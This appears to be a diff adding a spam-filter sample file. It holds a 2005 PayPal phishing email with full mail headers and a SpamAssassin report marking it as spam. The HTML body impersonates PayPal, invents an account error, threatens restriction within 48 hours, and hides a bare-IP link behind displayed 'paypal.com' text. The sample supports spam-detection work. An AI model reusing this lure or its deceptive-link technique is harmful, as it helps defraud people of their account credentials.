@@ -1,0 +1,65 @@
+From nobody Sun Jan 25 13:48:12 2015
+Return-Path: <meta@WallaceGraphicsServer.WallaceGraphicsServer>
+X-Original-To: nobody@login.example.com
+Delivered-To: nobody@login.example.com
+Received: from mail2.example.com (mail2.example.com [10.3.4.5])
+ by naughty.example.com (Postfix) with ESMTP id 2CBB4536E12
+ for <nobody@login.example.com>; Fri, 30 Dec 2005 21:13:28 -0500 (EST)
+Received: from mail2.example.com (localhost.example.com [127.0.0.1])
+ by mail2.example.com (Postfix) with ESMTP id 4074C6FA3F3
+ for <nobody@example.com>; Fri, 30 Dec 2005 21:13:27 -0500 (EST)
+Received: from WallaceGraphicsServer (unknown [69.15.220.162])
+ by mail2.example.com (Postfix) with ESMTP
+ for <nobody@example.com>; Fri, 30 Dec 2005 21:13:27 -0500 (EST)
+Received: by WallaceGraphicsServer (Postfix, from userid 1026)
+ id 26311214E3F; Fri, 30 Dec 2005 21:02:24 -0500 (EST)
+To: nobody@example.com
+Subject: Update Your PayPal Account
+From: PayPal Security Service <service@paypal.com>
+Content-Type: text/html
+Message-Id: <20051231020224.26311214E3F@WallaceGraphicsServer>
+Date: Fri, 30 Dec 2005 21:02:24 -0500 (EST)
+X-Spam-Flag: YES
+X-Spam-Checker-Version: SpamAssassin 3.0.2 (2004-11-16)
+X-Spam-Level: ******
+X-Spam-Status: Yes, score=6.4 required=5.0 tests=HTML_20_30,
+ HTML_IMAGE_ONLY_12,HTML_MESSAGE,HTML_MIME_NO_HTML_TAG,
+ MIME_HEADER_CTYPE_ONLY,MIME_HTML_ONLY,NORMAL_HTTP_TO_IP,
+ RAZOR2_CF_RANGE_51_100,RAZOR2_CHECK,RCVD_IN_BL_SPAMCOP_NET 
+ autolearn=no version=3.0.2
+X-Spam-Report: * 0.0 NORMAL_HTTP_TO_IP URI: Uses a dotted-decimal IP address
+ in URL
+ *  2.9 HTML_IMAGE_ONLY_12 BODY: HTML: images with 800-1200 bytes of words
+ *  0.0 HTML_MESSAGE BODY: HTML included in message
+ *  0.2 HTML_20_30 BODY: Message is 20% to 30% HTML
+ *  0.1 RAZOR2_CF_RANGE_51_100 BODY: Razor2 gives confidence level above 50%
+ *      [cf:  60]
+ *  0.2 MIME_HTML_ONLY BODY: Message only has text/html MIME parts
+ *  1.5 RAZOR2_CHECK Listed in Razor2 (http://razor.sf.net/)
+ *  1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
+ *      [Blocked - see <http://www.spamcop.net/bl.shtml?69.15.220.162>]
+ * 0.1 MIME_HEADER_CTYPE_ONLY 'Content-Type' found without required MIME
+ headers
+ *  0.1 HTML_MIME_NO_HTML_TAG HTML-only message, but there is no HTML tag
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 185
+
+
+<img src="http://www.paypalobjects.com/en_US/i/logo/paypal_logo.gif" align=left><br><br><br><br>
+Dear PayPal customer,<br><br>
+
+During our regularly scheduled account maintenance and verification procedures, we have detected a slight error in your account information.<br>
+This might be due to either of the following reasons:<br><br>
+
+<b>1.</b> A recent change in your personal information (i.e. change of address).<br>
+<b>2.</b> Submiting invalid information during the initial sign up process.<br>
+<b>3.</b> An inability to accurately verify your account information due to an internal error within our processors.<br><br>
+
+Please update and verify your account information with PayPal at:<br><br>
+<a href="http://82.208.42.194/~novak/paypal/" target=_blank><font color=#0000ff>http://www.paypal.com</font></a><br><br>
+If your information is not updated within <b>48</b> hours, then the ability to use your PayPal account will become restricted.<br><br><br>
+
+Kenneth Pavet<br>
+Safe Harbour Department
